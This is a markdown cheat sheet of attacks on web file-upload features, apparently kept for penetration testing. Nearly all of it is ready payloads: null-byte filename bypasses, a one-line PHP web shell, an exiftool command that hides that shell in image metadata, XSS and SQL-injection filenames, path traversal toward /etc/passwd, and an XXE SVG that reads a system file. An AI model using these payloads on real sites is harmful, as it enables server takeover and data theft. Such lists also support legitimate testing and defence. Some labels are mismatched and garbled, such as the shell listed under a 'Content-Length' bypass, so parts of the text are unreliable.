### Vulnerabilities via Arbitrary File Upload


### Bypasses

#### Null Byte Bypass
##### Make a file image.phpA.png and replace with Null Byte instead of A
```
image.php%00.png
image.php\x00.png
```

#### Content-Type Bypass
```
Content-Type: image/jpeg
```

#### Content-Length Bypass
```
<?php system($_GET['c']);?>
```

#### Magic Number Validation Bypass
##### Use Exiftool and instert malicious code
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['c']);?>' image.jpg
mv image.jpg image.php.jpg
```

### Chain With Other Vulnerabilities

#### XSS(Cross Site Scripting)
```
Filename: "><svg onload=alert(1)>.jpeg
xss.svg -> file contain xss payload inside svg format
```

#### SQL Injection
```
'sleep(10).jpg
```

#### Path Traversal
```
../../logo.png
../../etc/passwd/logo.png
```

#### RCE
```
ImageTragic
```

#### XXE
##### Filename: xxe.svg
##### Content-Type: image/svg+xml
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

#### SSRF
```
Change 'type=file' to 'type=url'
```

#### Uploaded file not found? Try Path Traversal on filename.
#### Try to brutefore file extension
